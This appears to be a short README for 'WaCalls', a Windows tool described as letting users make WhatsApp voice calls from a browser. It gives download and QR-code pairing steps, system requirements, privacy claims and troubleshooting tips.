📞 WaCalls - Make WhatsApp Calls From Your Browser

Download WaCalls for Windows

👋 About This Program

WaCalls connects your WhatsApp account to your web browser. This tool enables you to make and receive voice calls directly from your computer. You use your browser microphone and speakers for every conversation. The system works over your local network to keep your connection stable and clear.

🚀 How To Start

Follow these steps to set up the software on your Windows computer.

  1. Visit the official download page to select the latest version of WaCalls.
  2. Download the file that ends in .exe for your Windows system.
  3. Locate the file in your Downloads folder and double-click the icon to run it.
  4. A small black window opens. Keep this window running while you use the service.
  5. Open your web browser and navigate to the address shown in the black window.
  6. Scan the QR code on your screen using the WhatsApp app on your phone.
  7. Once the pairing completes, your account connects, and you can start your calls.

⚙️ System Requirements

WaCalls runs on most modern Windows computers. Ensure you meet these simple requirements for the best experience:

  • Windows 10 or Windows 11 operating system.
  • A working microphone attached to your computer.
  • A modern web browser like Google Chrome, Microsoft Edge, or Firefox.
  • An active WhatsApp account on your mobile device.
  • A stable local internet connection.

🛡️ Security and Privacy

Your privacy remains a priority. WaCalls acts as a bridge between your browser and the WhatsApp network. The software stores your session data only on your own computer. No external server monitors your calls or accesses your private messages. You control the connection at all times by closing the program window.

🔧 Troubleshooting Tips

If you encounter issues, try these steps to fix common problems:

  • No Audio: Check your browser settings to ensure it has permission to use your microphone.
  • Connection Errors: Restart the WaCalls program if the browser cannot find the service.
  • QR Code Fails: Ensure your phone has a strong internet signal when you scan the code.
  • Update: Always check the download link above to ensure you run the latest software version.
